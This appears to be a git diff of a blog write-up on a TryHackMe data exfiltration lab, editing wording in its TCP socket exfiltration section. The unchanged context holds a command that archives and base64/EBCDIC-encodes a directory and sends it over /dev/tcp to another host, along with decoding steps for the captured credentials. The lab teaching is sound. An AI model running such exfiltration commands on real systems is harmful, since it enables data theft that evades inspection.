@@ -14,7 +14,7 @@ mermaid: true
 
 This process is part of the last step on the [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html): *Action on Objectives*.
 
-![Cyber Kill Chain](https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/photo/cyber/THE-CYBER-KILL-CHAIN-body.png.pc-adaptive.1280.medium.png){: width="50%"}
+![Cyber Kill Chain](https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/photo/cyber/THE-CYBER-KILL-CHAIN-body.png.pc-adaptive.1280.medium.png){: width="70%"}
 
 # Network Infrastructure
 
@@ -34,9 +34,9 @@ It consists of two separate networks with multiple clients as well as a Jumpbox 
 | icmp.thm.com     | 192.168.0.121  | Net 2              |
 | victim1.thm.com  | 192.168.0.101  | Net 2              |
 
-It is recommended to connect via SSH to the Jumpbox machine, and perform the rooms exercises from there. The room also suggests using `tmux` to manage the SSH connections needed. 
+It is recommended to connect via SSH to the Jumpbox machine, and perform the rooms exercises from there. 
 
-Another way is to first connect to Jumpbox via SSH, then open a new terminal tab, connect to Jumpbox again, and from there connect to the required machine, e.g. `victim1`.
+The room also suggests using `tmux` to manage the SSH connections needed. Another way is to first connect to Jumpbox via SSH, then open a new terminal tab, connect to Jumpbox again, and from there connect to the required machine, e.g. `victim1`.
 
 # TCP Socket Exfiltration
 
@@ -72,7 +72,7 @@ This method is **easy to detect** as it relies on non-standard protocols, so it 
 
     ![Connect to victim1 from Jumpbox](ssh-from-jb-to-victim1.png)
 
-3. Now, we will use the **TCP Socket exfiltration** method. We will also use **data encoding**, a reversible form of data representation, and **archiving** so it is hard for someone to examine them during the trasmission, as it will be in a non-human readable format.
+3. Now, we will use the **TCP Socket exfiltration** method. We will also use **data encoding**, a reversible form of data representation, and **archiving**, so it is hard for someone to examine the data during the trasmission, as it will be in a non-human readable format.
 
     ```shell
     tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
@@ -118,10 +118,8 @@ This method is **easy to detect** as it relies on non-standard protocols, so it 
     
     Let's break down the commands again:
 
-    1. `dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar` does the opposite of what we did before.
-        - `dd conv=ascii if=task4-creds.data` This part of the command uses the `dd` utility to read data from the input file `task4-creds.data`. Here's what each option does:
-            - `conv=ascii` This option specifies that the data should be converted from *EBCDIC* encoding to *ASCII*.
-            - `if=task4-creds.data` This option specifies the input file as `task4-creds.data`.
+    1. `dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar` does the opposite of what we did before, that is, decoding the data.
+        - `dd conv=ascii if=task4-creds.data` This part of the command uses the `dd` utility to read data from the input file `task4-creds.data`. The `conv=ascii` option specifies that the data should be converted from *EBCDIC* encoding to *ASCII*. The `if=task4-creds.data` option specifies the input file as `task4-creds.data`.
 
         - `|` This is a pipe operator, which we explained before.
 
@@ -130,8 +128,8 @@ This method is **easy to detect** as it relies on non-standard protocols, so it 
         - `> task4-creds.tar` This portion of the command redirects the decoded data to an output file named `task4-creds.tar`. The data, which was originally encoded and then decoded, is saved in this file.
 
     2. `tar` We are using the `tar` utility again, but this time for extracting the directory.
-        - `x` This option stands for "extract." It is used to extract the contents of an archive.
-        - `f` This option specifies that the next argument will be the name of the archive file from which you want to extract the contents. In this case, `task4-creds.tar` is the archive file.
+        - `x` This option stands for "extract", and it is used to extract the contents of an archive.
+        - `f` This option specifies that the next argument will be the name of the archive file from which we want to extract the contents. In this case, `task4-creds.tar` is the archive file.
 
 
     ![Decoding and unarchiving data](decode-unarchive-data.png)
